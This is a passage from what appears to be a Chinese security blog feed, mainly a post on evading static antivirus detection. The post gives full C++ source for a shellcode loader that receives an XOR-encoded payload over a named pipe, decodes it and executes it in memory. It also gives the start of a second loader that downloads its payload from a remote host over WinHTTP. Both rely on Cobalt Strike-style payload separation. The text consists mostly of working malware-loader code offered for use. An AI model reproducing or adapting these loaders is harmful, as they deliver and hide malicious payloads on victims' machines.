javax.sound.sampled.AudioFormat$Encoding</strong></p><p><strong>CLASSNAME: com.sun.org.apache.xpath.internal.objects.XStringForFSB</strong></p><p><strong>CLASSNAME: com.sun.org.apache.xpath.internal.objects.XString</strong></p><p><strong>CLASSNAME: javax.sound.sampled.AudioFileFormat$Type</strong></p><p>哎，只要放以前就是4条cve</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>finechanneljdbc工具说明</title>
    <link href="/2024/06/23/finechanneljdbc%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E/"/>
    <url>/2024/06/23/finechanneljdbc%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6ee29cbea345a17f86f1cb178868814ccd2fc21829c9740607408e8e46b9494e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>漏洞工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某报表最新反序列漏洞</title>
    <link href="/2024/06/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/06/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c1593e47211a1712106c6f227f2f4a0aba385dca8093b8a6f022c83d6f9061d2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态恶意代码逃逸(三)</title>
    <link href="/2024/06/08/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%B8%89/"/>
    <url>/2024/06/08/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h2><h3 id="0x01-管道接收shellcode"><a href="#0x01-管道接收shellcode" class="headerlink" title="0x01 管道接收shellcode"></a>0x01 管道接收shellcode</h3><p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p><p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFF_SIZE 1024</span><br> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br><span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br><span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br><span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br><span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br><span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br><span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br><span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br><span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br><span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br><span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br><span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br><span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br> <span class="hljs-type">const</span> TCHAR* ptsPipeName = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\\\\.\\pipe\\BadCodeTest&quot;</span>);<br><span class="hljs-function">BOOL <span class="hljs-title">RecvShellcode</span><span class="hljs-params">(VOID)</span> </span>&#123;<br>    HANDLE hPipeClient;<br>    DWORD dwWritten;<br>    DWORD dwShellcodeSize = <span class="hljs-built_in">sizeof</span>(buf);  <span class="hljs-comment">// 获取buf的大小作为shellcode的大小</span><br>    <span class="hljs-comment">// 等待管道可用</span><br>    <span class="hljs-built_in">WaitNamedPipe</span>(ptsPipeName, NMPWAIT_WAIT_FOREVER);  <span class="hljs-comment">// 等待命名管道可用</span><br>    <span class="hljs-comment">// 连接管道</span><br>    hPipeClient = <span class="hljs-built_in">CreateFile</span>(<br>        ptsPipeName,<br>        GENERIC_WRITE,<br>        FILE_SHARE_READ,<br>        <span class="hljs-literal">NULL</span>,<br>        OPEN_EXISTING,<br>        FILE_ATTRIBUTE_NORMAL,<br>        <span class="hljs-literal">NULL</span><br>    );  <span class="hljs-comment">// 创建文件句柄以连接到命名管道</span><br><br>    <span class="hljs-keyword">if</span> (hPipeClient == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 无法打开管道，返回失败</span><br>    &#125;<br><br>    <span class="hljs-built_in">WriteFile</span>(hPipeClient, buf, dwShellcodeSize, &amp;dwWritten, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 将shellcode写入管道</span><br>    <span class="hljs-keyword">if</span> (dwWritten == dwShellcodeSize) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hPipeClient);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>, dwShellcodeSize);<br>        <span class="hljs-keyword">return</span> TRUE;  <span class="hljs-comment">// 写入成功，返回成功</span><br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hPipeClient);<br>    <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 写入失败，返回失败</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, TCHAR* argv[])</span> </span>&#123;<br><br>    HANDLE hPipe;<br>    DWORD dwError;<br>    CHAR szBuffer[BUFF_SIZE];<br>    DWORD dwLen;<br>    PCHAR pszShellcode = <span class="hljs-literal">NULL</span>;<br>    DWORD dwOldProtect;  <span class="hljs-comment">// 用于存储内存页属性</span><br>    HANDLE hThread;<br>    DWORD dwThreadId;<br>    <span class="hljs-comment">// 创建命名管道</span><br>    hPipe = <span class="hljs-built_in">CreateNamedPipe</span>(<br>        ptsPipeName,<br>        PIPE_ACCESS_INBOUND,<br>        PIPE_TYPE_BYTE | PIPE_WAIT,<br>        PIPE_UNLIMITED_INSTANCES,<br>        BUFF_SIZE,<br>        BUFF_SIZE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span><br>    );<br><br>    <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE) &#123;<br>        dwError = <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-]Create Pipe Error : %d \n&quot;</span>, dwError);<br>        <span class="hljs-keyword">return</span> dwError;  <span class="hljs-comment">// 创建命名管道失败，返回错误码</span><br>    &#125;<br><br>    <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvShellcode, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 创建线程等待接收shellcode</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ConnectNamedPipe</span>(hPipe, <span class="hljs-literal">NULL</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Client Connected...\n&quot;</span>);<br>        <span class="hljs-built_in">ReadFile</span>(hPipe, szBuffer, BUFF_SIZE, &amp;dwLen, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 从管道中读取数据</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get DATA Length : %d \n&quot;</span>, dwLen);<br>        <span class="hljs-comment">// 申请内存页</span><br>        pszShellcode = (PCHAR)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwLen, MEM_COMMIT, PAGE_READWRITE);  <span class="hljs-comment">// 在内存中分配空间</span><br>        <span class="hljs-comment">// 拷贝内存</span><br>        <span class="hljs-built_in">CopyMemory</span>(pszShellcode, szBuffer, dwLen);  <span class="hljs-comment">// 将数据复制到分配的内存中</span><br><br>        <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwLen; i++) &#123;<br>            <span class="hljs-comment">//Sleep(50);</span><br>            _InterlockedXor8(pszShellcode + i, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 对内存中的数据进行异或操作</span><br>        &#125;<br><br>        <span class="hljs-comment">// 更改内存页属性为可执行</span><br>        <span class="hljs-built_in">VirtualProtect</span>(pszShellcode, dwLen, PAGE_EXECUTE, &amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>        hThread = <span class="hljs-built_in">CreateThread</span>(<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-literal">NULL</span>,<br>            (LPTHREAD_START_ROUTINE)pszShellcode,<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-literal">NULL</span>,<br>            &amp;dwThreadId<br>        );<br><br>        <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);  <span class="hljs-comment">// 等待线程执行完毕</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没看，贴的代码，感觉没啥调用。</p><h3 id="0x02-http-分离"><a href="#0x02-http-分离" class="headerlink" title="0x02 http 分离"></a>0x02 http 分离</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winhttp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;winhttp.lib&quot;</span>)</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">WinGet</span><span class="hljs-params">(<span class="hljs-type">char</span>* ip, <span class="hljs-type">int</span> port, <span class="hljs-type">char</span>* url)</span></span><br><span class="hljs-function"></span>&#123;<br><br>HINTERNET hSession = <span class="hljs-literal">NULL</span>;<br>HINTERNET hConnect = <span class="hljs-literal">NULL</span>;<br>HINTERNET hRequest = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//************ 将char转换为wchar_t *****************/</span><br><span class="hljs-type">int</span> ipSize;<br><span class="hljs-type">wchar_t</span>* ip_wchar;<br><span class="hljs-comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span><br>ipSize = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, ip, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//iSize =wcslen(pwsUnicode)+1=6</span><br>ip_wchar = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(ipSize * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>)); <span class="hljs-comment">//不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))</span><br><span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, ip, <span class="hljs-number">-1</span>, ip_wchar, ipSize);<br><br><span class="hljs-type">int</span> urlSize;<br><span class="hljs-type">wchar_t</span>* url_wchar;<br><span class="hljs-comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span><br>urlSize = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, url, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//iSize =wcslen(pwsUnicode)+1=6</span><br>url_wchar = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(urlSize * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>)); <span class="hljs-comment">//不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))</span><br><span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, url, <span class="hljs-number">-1</span>, url_wchar, urlSize);<br><span class="hljs-comment">//************ ********************************* *****************/</span><br><br><br><span class="hljs-comment">//port = 80; //默认端口</span><br><br><span class="hljs-comment">//1. 初始化一个WinHTTP-session句柄，参数1为此句柄的名称</span><br>hSession = <span class="hljs-built_in">WinHttpOpen</span>(<span class="hljs-string">L&quot;WinHTTP Example/1.0&quot;</span>,<br>WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,<br>WINHTTP_NO_PROXY_NAME,<br>WINHTTP_NO_PROXY_BYPASS, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (hSession == <span class="hljs-literal">NULL</span>) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:Open session failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//2. 通过上述句柄连接到服务器，需要指定服务器IP和端口号 INTERNET_DEFAULT_HTTP_PORT:80。若连接成功，返回的hConnect句柄不为NULL</span><br>hConnect = <span class="hljs-built_in">WinHttpConnect</span>(hSession, ip_wchar, port, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hConnect == <span class="hljs-literal">NULL</span>) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:Connect failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//3. 通过hConnect句柄创建一个hRequest句柄，用于发送数据与读取从服务器返回的数据。</span><br>hRequest = <span class="hljs-built_in">WinHttpOpenRequest</span>(hConnect, <span class="hljs-string">L&quot;GET&quot;</span>, url_wchar, <span class="hljs-literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//其中参数2表示请求方式，此处为Get；参数3:给定Get的具体地址，如这里的具体地址为https://www.citext.cn/GetTime.php</span><br><span class="hljs-keyword">if</span> (hRequest == <span class="hljs-literal">NULL</span>) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:OpenRequest failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>BOOL bResults;<br><span class="hljs-comment">//发送请求</span><br>bResults = <span class="hljs-built_in">WinHttpSendRequest</span>(hRequest,<br>WINHTTP_NO_ADDITIONAL_HEADERS,<br><span class="hljs-number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="hljs-number">0</span>,<br><span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!bResults) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error:SendRequest failed: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//（3） 发送请求成功则准备接受服务器的response。注意：在使用 WinHttpQueryDataAvailable和WinHttpReadData前必须使用WinHttpReceiveResponse才能access服务器返回的数据</span><br>bResults = <span class="hljs-built_in">WinHttpReceiveResponse</span>(hRequest, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><br>LPVOID lpHeaderBuffer = <span class="hljs-literal">NULL</span>;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//4-3. 获取服务器返回数据</span><br>LPSTR pszOutBuffer = <span class="hljs-literal">NULL</span>;<br>DWORD dwDownloaded = <span class="hljs-number">0</span>;         <span class="hljs-comment">//实际收取的字符数</span><br><span class="hljs-type">wchar_t</span>* pwText = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (bResults)<br>&#123;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">//(1) 获取返回数据的大小（以字节为单位）</span><br>dwSize = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize)) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error：WinHttpQueryDataAvailable failed：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!dwSize)    <span class="hljs-keyword">break</span>;  <span class="hljs-comment">//数据大小为0                </span><br><br><span class="hljs-comment">//(2) 根据返回数据的长度为buffer申请内存空间</span><br>pszOutBuffer = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[dwSize + <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (!pszOutBuffer) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Out of memory.&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">ZeroMemory</span>(pszOutBuffer, dwSize + <span class="hljs-number">1</span>);       <span class="hljs-comment">//将buffer置0</span><br><br><span class="hljs-comment">//(3) 通过WinHttpReadData读取服务器的返回数据</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WinHttpReadData</span>(hRequest, pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error：WinHttpQueryDataAvailable failed：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">if</span> (!dwDownloaded)<br><span class="hljs-keyword">break</span>;<br><br><br>&#125; <span class="hljs-keyword">while</span> (dwSize &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">//4-4. 将返回数据转换成UTF8</span><br>DWORD dwNum = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, pszOutBuffer, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//返回原始ASCII码的字符数目       </span><br>pwText = <span class="hljs-keyword">new</span> <span class="hljs-type">wchar_t</span>[dwNum];                                                <span class="hljs-comment">//根据ASCII码的字符数分配UTF8的空间</span><br><span class="hljs-built_in">MultiByteToWideChar</span>(CP_UTF8, <span class="hljs-number">0</span>, pszOutBuffer, <span class="hljs-number">-1</span>, pwText, dwNum);           <span class="hljs-comment">//将ASCII码转换成UTF8</span><br><span class="hljs-comment">//printf(&quot;\n返回数据为:\n%S\n\n&quot;, pwText);</span><br><br><br>&#125;<br><br><span class="hljs-comment">//5. 